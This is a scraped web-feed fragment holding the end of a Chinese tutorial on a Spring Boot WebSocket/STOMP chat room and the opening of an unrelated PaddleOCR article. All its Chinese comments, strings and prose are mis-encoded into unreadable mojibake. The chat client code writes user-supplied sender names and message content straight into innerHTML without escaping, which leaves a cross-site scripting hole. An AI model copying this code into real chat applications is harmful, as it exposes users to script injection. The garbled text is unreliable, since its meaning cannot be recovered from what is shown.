            <span class="hljs-keyword">const</span> socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SockJS</span>(<span class="hljs-string">'/ws-chat'</span>);
            stompClient = <span class="hljs-title class_">Stomp</span>.<span class="hljs-title function_">over</span>(socket);
            
            stompClient.<span class="hljs-title function_">connect</span>({}, <span class="hljs-keyword">function</span>(<span class="hljs-params">frame</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è¿æ¥æˆåŠŸï¼æœåŠ¡å™¨è¯´ï¼š"</span> + frame);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"å·²è¿æ¥"</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'connect-area'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'chat-area'</span>).<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
                
                <span class="hljs-comment">// è®¢é˜…å…¬å…±é¢‘é“ - ç›¸å½“äºâ€œååœ¨å¤§å…å¬å¹¿æ’­â€</span>
                stompClient.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'/topic/public'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) {
                    <span class="hljs-title function_">showMessage</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-property">body</span>));
                });
                
                <span class="hljs-comment">// è®¢é˜…ç§äººé¢‘é“ - ç›¸å½“äºâ€œæˆ´ä¸Šè€³æœºå¬æ‚„æ‚„è¯â€</span>
                stompClient.<span class="hljs-title function_">subscribe</span>(<span class="hljs-string">'/user/queue/private'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">message</span>) {
                    <span class="hljs-keyword">const</span> msg = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(message.<span class="hljs-property">body</span>);
                    msg.<span class="hljs-property">isPrivate</span> = <span class="hljs-literal">true</span>;
                    <span class="hljs-title function_">showMessage</span>(msg);
                });
                
                <span class="hljs-comment">// å‘é€åŠ å…¥æ¶ˆæ¯</span>
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.addUser"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({<span class="hljs-attr">sender</span>: username, <span class="hljs-attr">type</span>: <span class="hljs-string">'JOIN'</span>})
                );
            }, <span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>) {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"è¿æ¥å¤±è´¥ï¼š"</span> + error);
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'status'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">"è¿æ¥å¤±è´¥"</span>;
            });
        }
        
        <span class="hljs-comment">// å‘é€æ¶ˆæ¯ - ç›¸å½“äºâ€œå¯¹ç€è¯ç­’å–Šè¯â€</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> messageInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'message-input'</span>);
            <span class="hljs-keyword">const</span> content = messageInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            
            <span class="hljs-keyword">if</span> (content &amp;&amp; stompClient) {
                <span class="hljs-keyword">const</span> chatMessage = {
                    <span class="hljs-attr">sender</span>: username,
                    <span class="hljs-attr">content</span>: content,
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'CHAT'</span>
                };
                
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.sendMessage"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(chatMessage)
                );
                messageInput.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
            }
        }
        
        <span class="hljs-comment">// å‘é€ç§èŠ</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendPrivate</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> toUser = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-to'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            <span class="hljs-keyword">const</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-message'</span>).<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            
            <span class="hljs-keyword">if</span> (toUser &amp;&amp; content &amp;&amp; stompClient) {
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.private"</span>, {<span class="hljs-attr">to</span>: toUser}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                        <span class="hljs-attr">sender</span>: username,
                        <span class="hljs-attr">content</span>: content,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'CHAT'</span>
                    })
                );
                <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'private-message'</span>).<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
            }
        }
        
        <span class="hljs-comment">// æ˜¾ç¤ºæ¶ˆæ¯ - ç›¸å½“äºâ€œæŠŠè¯å†™åœ¨èŠå¤©è®°å½•ä¸Šâ€</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">showMessage</span>(<span class="hljs-params">message</span>) {
            <span class="hljs-keyword">const</span> messageArea = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'message-area'</span>);
            <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
            
            messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'message'</span>);
            
            <span class="hljs-comment">// æ ¹æ®ä¸åŒæ¶ˆæ¯ç±»å‹è®¾ç½®æ ·å¼</span>
            <span class="hljs-keyword">if</span> (message.<span class="hljs-property">isPrivate</span>) {
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;<span class="hljs-subst">${message.sender}</span> æ‚„æ‚„å¯¹ä½ è¯´ï¼š&lt;/strong&gt;
                    &lt;br/&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
                messageElement.<span class="hljs-property">style</span>.<span class="hljs-property">background</span> = <span class="hljs-string">'#fce4ec'</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">type</span> === <span class="hljs-string">'JOIN'</span>) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'system-message'</span>, <span class="hljs-string">'join-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`<span class="hljs-subst">${message.content}</span>`</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">type</span> === <span class="hljs-string">'LEAVE'</span>) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'system-message'</span>, <span class="hljs-string">'leave-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`<span class="hljs-subst">${message.content}</span>`</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (message.<span class="hljs-property">sender</span> === username) {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'my-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;æˆ‘ï¼š&lt;/strong&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
            } <span class="hljs-keyword">else</span> {
                messageElement.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'their-message'</span>);
                messageElement.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`
                    &lt;strong&gt;<span class="hljs-subst">${message.sender}</span>ï¼š&lt;/strong&gt;<span class="hljs-subst">${message.content}</span>
                    &lt;br/&gt;&lt;small&gt;<span class="hljs-subst">${message.timestamp}</span>&lt;/small&gt;
                `</span>;
            }
            
            messageArea.<span class="hljs-title function_">appendChild</span>(messageElement);
            messageArea.<span class="hljs-property">scrollTop</span> = messageArea.<span class="hljs-property">scrollHeight</span>;
        }
        
        <span class="hljs-comment">// é¡µé¢å…³é—­æ—¶å‘é€ç¦»å¼€æ¶ˆæ¯</span>
        <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (stompClient &amp;&amp; username) {
                stompClient.<span class="hljs-title function_">send</span>(<span class="hljs-string">"/app/chat.sendMessage"</span>, {}, 
                    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                        <span class="hljs-attr">sender</span>: username,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'LEAVE'</span>,
                        <span class="hljs-attr">content</span>: <span class="hljs-string">''</span>
                    })
                );
            }
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">ç¬¬5æ­¥ï¼šè¿›é˜¶åŠŸèƒ½â€”â€”è®©èŠå¤©å®¤æ›´â€œç‚«é…·â€</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 1. åœ¨çº¿ç”¨æˆ·ç®¡ç†</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatUserService</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">String</span>&gt; onlineUsers = <span class="hljs-title class_">ConcurrentHashMap</span>.<span class="hljs-title function_">newKeySet</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">userConnected</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        onlineUsers.<span class="hljs-title function_">add</span>(username);
        <span class="hljs-title function_">broadcastOnlineUsers</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">userDisconnected</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> username</span>) {
        onlineUsers.<span class="hljs-title function_">remove</span>(username);
        <span class="hljs-title function_">broadcastOnlineUsers</span>();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">broadcastOnlineUsers</span>(<span class="hljs-params"/>) {
        messagingTemplate.<span class="hljs-title function_">convertAndSend</span>(<span class="hljs-string">"/topic/onlineUsers"</span>, onlineUsers);
    }
}

<span class="hljs-comment">// 2. æ¶ˆæ¯æŒä¹…åŒ–ï¼ˆä¿å­˜èŠå¤©è®°å½•ï¼‰</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatMessageService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">ChatMessageRepository</span> repository;
    
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">saveMessage</span>(<span class="hljs-params">ChatMessage message</span>) {
        repository.<span class="hljs-title function_">save</span>(message);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ¶ˆæ¯å·²ä¿å­˜åˆ°æ•°æ®åº“ï¼Œä»¥åå¯ä»¥ç¿»æ—§è´¦äº†"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">ChatMessage</span>&gt; <span class="hljs-title function_">getRecentMessages</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> repository.<span class="hljs-title function_">findTop50ByOrderByTimestampDesc</span>();
    }
}

<span class="hljs-comment">// 3. æ¶ˆæ¯æ‹¦æˆªå™¨ï¼ˆæ•æ„Ÿè¯è¿‡æ»¤ï¼‰</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChannelInterceptor</span> {
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">String</span>[] sensitiveWords = {<span class="hljs-string">"å¯†ç "</span>, <span class="hljs-string">"é“¶è¡Œå¡"</span>, <span class="hljs-string">"Væˆ‘50"</span>};
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Message</span>&lt;?&gt; <span class="hljs-title function_">preSend</span>(<span class="hljs-params">Message&lt;?&gt; message, MessageChannel channel</span>) {
        <span class="hljs-title class_">String</span> content = message.<span class="hljs-title function_">getPayload</span>().<span class="hljs-title function_">toString</span>();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">String</span> word : sensitiveWords) {
            <span class="hljs-keyword">if</span> (content.<span class="hljs-title function_">contains</span>(word)) {
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"æ£€æµ‹åˆ°æ•æ„Ÿè¯ï¼Œæ¶ˆæ¯å·²è¢«åæ‰"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// åæ‰æ¶ˆæ¯</span>
            }
        }
        
        <span class="hljs-keyword">return</span> message;
    }
}
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€æ€»ç»“ï¼šä»â€œHTTPçš„å°¬èŠâ€åˆ°â€œWebSocketçš„ç•…èŠâ€</h2>
<h3 data-id="heading-8">WebSocketçš„ä¼˜åŠ¿ï¼š</h3>
<ol>
<li><strong>çœŸæ­£çš„åŒå‘é€šä¿¡</strong>ï¼šä¸å†æ˜¯â€œä½ é—®æˆ‘ç­”â€ï¼Œè€Œæ˜¯â€œç•…æ‰€æ¬²è¨€â€</li>
<li><strong>ä½å»¶è¿Ÿ</strong>ï¼šæ¶ˆæ¯å®æ—¶åˆ°è¾¾ï¼Œä¸ç”¨ç­‰HTTPçš„â€œå¿«é€’å‘˜â€æ¥å›è·‘</li>
<li><strong>å‡å°‘å¸¦å®½</strong>ï¼šä¸€æ¬¡æ¡æ‰‹ï¼Œå¤šæ¬¡é€šä¿¡ï¼Œçœå»äº†HTTPçš„â€œå®¢å¥—è¯â€</li>
<li><strong>æ›´å°‘çš„æœåŠ¡å™¨å‹åŠ›</strong>ï¼šä¸ç”¨ç»´æŠ¤æˆåƒä¸Šä¸‡çš„è½®è¯¢è¯·æ±‚</li>
</ol>
<h3 data-id="heading-9">SpringBooté›†æˆWebSocketçš„æ ¸å¿ƒæ€æƒ³ï¼š</h3>
<ol>
<li><strong>é…ç½®æ˜¯éª¨æ¶</strong>ï¼š<code>@EnableWebSocketMessageBroker</code> æ˜¯æ¿€æ´»å’’è¯­</li>
<li><strong>æ§åˆ¶å™¨æ˜¯å¤§è„‘</strong>ï¼š<code>@MessageMapping</code> æŒ‡å®šæ¶ˆæ¯æ¥æ”¶ç‚¹</li>
<li><strong>æ¶ˆæ¯ä»£ç†æ˜¯å¹¿æ’­ç«™</strong>ï¼š<code>SimpleBroker</code> è´Ÿè´£æ¶ˆæ¯åˆ†å‘</li>
<li><strong>STOMPæ˜¯åè®®ç¿»è¯‘å®˜</strong>ï¼šæŠŠWebSocketçš„æ¶ˆæ¯ç¿»è¯‘æˆå¤§å®¶éƒ½èƒ½æ‡‚çš„è¯­è¨€</li>
</ol>
<h3 data-id="heading-10">å¼€å‘å¿ƒå¾—ï¼š</h3>
<ol>
<li><strong>å‰ç«¯è¿æ¥è®°ä½ä¸‰æ­¥æ›²</strong>ï¼šSockJSåˆ›å»ºè¿æ¥ â†’ Stompå°è£…åè®® â†’ è®¢é˜…/å‘é€æ¶ˆæ¯</li>
<li><strong>åç«¯å¼€å‘è®°ä½ä¸‰æ³¨è§£</strong>ï¼š<code>@MessageMapping</code>ï¼ˆæ”¶ä¿¡ï¼‰ã€<code>@SendTo</code>ï¼ˆå¹¿æ’­ï¼‰ã€<code>@Payload</code>ï¼ˆå–å†…å®¹ï¼‰</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒè¦åŠ æ–™</strong>ï¼šè®¤è¯ã€æˆæƒã€SSLã€é›†ç¾¤æ”¯æŒã€ç›‘æ§æŒ‡æ ‡...</li>
</ol>
<h3 data-id="heading-11">æœ€åï¼š</h3>
<blockquote>
<p>ä»å‰ï¼ŒHTTPæ¯æ¬¡èŠå¤©éƒ½è¦é‡æ–°æ¡æ‰‹ï¼Œåƒæäº†ç¤¾æäººå£«æ¯æ¬¡å¼€å£å‰éƒ½è¦å¿ƒç†å»ºè®¾åŠå¤©ã€‚</p>
<p>ç°åœ¨ï¼ŒWebSocketä¸€æ¬¡æ¡æ‰‹ç»ˆèº«è¿æ¥ï¼Œå°±åƒå¥½å“¥ä»¬å„¿ä¹‹é—´ï¼šâ€œåˆ«åºŸè¯ï¼Œç›´æ¥è¯´ï¼â€</p>
<p>è€ŒSpringBootå°±æ˜¯é‚£ä¸ªè´´å¿ƒçš„ç®¡å®¶ï¼Œå¸®ä½ æŠŠWebSocketçš„å„ç§å¤æ‚é…ç½®éƒ½æ‰“åŒ…å¥½ï¼Œä½ åªéœ€è¦ï¼š</p>
<ol>
<li>åŠ ä¸ªä¾èµ–ï¼ˆç‚¹æ¯å’–å•¡ï¼‰</li>
<li>å†™ä¸ªé…ç½®ç±»ï¼ˆæ‘†å¥½æ¡Œæ¤…ï¼‰</li>
<li>å†™ä¸ªæ§åˆ¶å™¨ï¼ˆæ‰¾ä¸ªä¸»æŒäººï¼‰</li>
<li>å‰ç«¯è¿ä¸€ä¸‹ï¼ˆå®¢äººå…¥åœºï¼‰</li>
</ol>
<p>ç„¶åå°±å¯ä»¥äº«å—ï¼š<strong>é«˜æ€§èƒ½ã€ä½å»¶è¿Ÿã€å…¨åŒå·¥çš„èŠå¤©ä½“éªŒ</strong>ï¼</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36753f9a28ae4a7ca6a32438d46276be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769476114&amp;x-signature=fJCHZWBAal1tbI0w%2F9J3d2gjSt8%3D" alt="WebSocketï¼šè®©HTTPçš„â€œå°¬èŠâ€å˜æˆçœŸæ­£çš„â€œç•…èŠâ€.png" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç™¾åº¦å¼€æºï¼Œä¸€ä¸ªå¼ºå¤§ã€è½»é‡çº§çš„ OCR å·¥å…·åŒ…ï¼ˆé™„æºç ï¼‰]]></title>    <link>https://juejin.cn/post/7596905015367794688</link>    <guid>https://juejin.cn/post/7596905015367794688</guid>    <pubDate>2026-01-20T01:37:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905015367794688" data-draft-id="7596962772143996943" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç™¾åº¦å¼€æºï¼Œä¸€ä¸ªå¼ºå¤§ã€è½»é‡çº§çš„ OCR å·¥å…·åŒ…ï¼ˆé™„æºç ï¼‰"/> <meta itemprop="keywords" content="åç«¯,ç™¾åº¦,ç™¾åº¦é£æ¡¨"/> <meta itemprop="datePublished" content="2026-01-20T01:37:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç™¾åº¦å¼€æºï¼Œä¸€ä¸ªå¼ºå¤§ã€è½»é‡çº§çš„ OCR å·¥å…·åŒ…ï¼ˆé™„æºç ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:37:00.000Z" title="Tue Jan 20 2026 01:37:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<p>å¦‚æœä½ ä¹Ÿè¢«ä¸‹é¢è¿™äº›äº‹æŠ˜ç£¨è¿‡ï¼Œå¤§æ¦‚ä¼šæ‡‚æˆ‘ä¸ºä»€ä¹ˆå¯¹ PaddleOCR è¿™ä¹ˆæœ‰å¥½æ„Ÿï¼š</p>
<ul>
<li>å¼€ä¼šæ‹çš„ç™½æ¿ï¼Œæƒ³æ•´ç†æˆæ–‡æ¡£ï¼Œåªèƒ½å¯¹ç€ç…§ç‰‡ä¸€ä¸ªå­—ä¸€ä¸ªå­—æ•²ï¼›</li>
<li>å®¢æˆ·å‘æ¥çš„ PDF åˆåŒï¼Œâ€œå¤åˆ¶ç²˜è´´â€æŒ‰é’®æ°¸è¿œæ˜¯ç°çš„ï¼Œåªèƒ½æ‰‹åŠ¨æŠ„ï¼›</li>
